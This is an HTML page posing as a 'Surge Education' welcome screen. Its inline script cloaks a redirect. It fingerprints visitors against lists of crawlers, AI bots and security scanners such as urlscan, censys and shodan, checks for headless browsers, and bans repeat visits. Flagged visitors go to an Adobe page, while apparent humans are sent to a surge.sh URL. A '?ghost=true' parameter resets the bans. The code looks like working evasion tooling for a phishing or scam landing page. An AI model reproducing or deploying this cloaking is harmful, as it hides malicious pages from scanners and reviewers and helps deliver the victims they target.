<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> Surge Education learn |Welcome...</title>
    <style>
        /* Optional: Styled loading state so humans don't see a blank white screen */
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f9f9f9; }
        .loader { text-align: center; color: #333; }
    </style>
    <script>
    (function() {
        // Target link for verified humans
        const TARGET_URL = 'https://newlearner-com.surge.sh/welearnquick.com';

        // Helper function to wipe HTML content and send bots away
        // Moved to the top to prevent runtime ReferenceErrors during early conditional calls
        function blockAccess(msg) {
            // Default argument fallback in case it is called with no parameters
            const displayMsg = msg !== undefined ? msg : "";
            if (document.documentElement) {
                document.documentElement.innerHTML = `<h1 style="text-align:center; margin-top:20%; font-family:sans-serif;">${displayMsg}</h1>`;
            }
            window.location.replace('https://www.adobe.com/uk/learn/acrobat');
        }

        function isAutomatedBrowser() {
            if (navigator.webdriver) return true;
            if (navigator.plugins && navigator.plugins.length === 0) return true;
            if (!navigator.languages || navigator.languages.length === 0) return true;

            // Catch headless cloud screen dimensions (often exactly 800x600 or 1280x800 default sandboxes)
            if (window.innerWidth === 800 && window.innerHeight === 600) return true;

            return false;
        }

        // 1. UNIQUE SECRET OVERRIDE (?ghost=true)
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.get('ghost') === 'true') {
            localStorage.removeItem('traffic_logs');
            localStorage.removeItem('permanently_banned_bot');
            const cleanUrl = window.location.protocol + "//" + window.location.host + window.location.pathname;
            window.history.replaceState({ path: cleanUrl }, '', cleanUrl);
        }

        // 2. LIFETIME BAN CHECK
        if (localStorage.getItem('permanently_banned_bot') === 'true') {
            blockAccess(".");
            return;
        }

        // 3. LAYER 1: INSTANTLY BAN WELL-BEHAVED BOTS
        const botList = [
            // Original list
            'googlebot', 'bingbot', 'duckduckbot', 'baiduspider', 'yandex',
            'ia_archiver', 'mj12bot', 'gptbot', 'claude-bot', 'claudebot', 'Slurp',
            'YandexBot', 'AhrefsBot', 'SemrushBot', 'MJ12Bot', 'ChatGPT-User', 'OAI-SearchBot',
            'anthropic-ai', 'PerplexityBot', 'censys.io', 'shodan', 'BitSightBot',

            // AI & LLM training scrapers
            'applebot-extended', 'amazonbot', 'cohere-ai', 'metaexternalfetch',
            'facebookexternalhit', 'perplexitybot', 'youbot', 'oai-searchbot', 'bytespider', 'diffbot',

            // SEO & Auditing Spiders
            'ahrefsbot', 'semrushbot', 'splitbee', 'dotbot', 'rogerbot',
            'screaming frog seo spider', 'siteexplorerbot', 'megaindex', 'spyfu', 'uptimerobot',

            // Alternative Search Engines
            'sogou', 'exabot', 'facebot', 'coccocbot', 'qwantify', 'Twitterbot', 'LinkedInBot', 'Slackbot',
            'Pinterestbot',

            // Programmatic Scraper Libraries
            'wget', 'curl', 'python-requests', 'go-http-client', 'urlscanbot', 'java', 'axios', 'headlesschrome'
        ];

        // Create the dynamic regular expression from the array
        const blockedBots = new RegExp(botList.join('|'), 'i');

        if (blockedBots.test(navigator.userAgent)) {
            localStorage.setItem('permanently_banned_bot', 'true');
            blockAccess(".");
            return;
        }

        // 4. LAYER 1.5: ADVANCED BROWSER FINGERPRINT CHECK
        if (isAutomatedBrowser()) {
            localStorage.setItem('permanently_banned_bot', 'true');
            blockAccess();
            return;
        }

        // 4. TRAFFIC LOGGING ENGINE
        const NOW = Date.now();
        const ROGUE_WINDOW = 5000;       // 5 seconds to catch aggressive scrapers
        const HUMAN_WINDOW = 86400000;   // 24 hours for human pacing

        let timestamps = JSON.parse(localStorage.getItem('traffic_logs') || '[]');

        // Clean out timestamps older than 24 hours
        timestamps = timestamps.filter(time => NOW - time < HUMAN_WINDOW);
        timestamps.push(NOW);
        localStorage.setItem('traffic_logs', JSON.stringify(timestamps));

        // 5. LAYER 2: BAN CLOAKED / ROGUE BOTS FOR LIFE
        const recentClicks = timestamps.filter(time => NOW - time < ROGUE_WINDOW);
        if (recentClicks.length > 1) {
            localStorage.setItem('permanently_banned_bot', 'true');
            blockAccess(".");
            return;
        }

        // 6. LAYER 3: HUMAN PACE LIMITING
        if (timestamps.length > 2) {
            blockAccess(".");
            return;
        }

        // 7. SUCCESS: ALL CHECKS PASSED ( Human goto)
        window.location.replace(TARGET_URL);
    })();
    </script>
</head>
<body>
    <!-- Hidden fallback container showing a loading message to humans while script runs -->
    <div class="loader">
        <h2>Surge Education learn...</h2>
        <p>..</p>
    </div>
</body>
</html>
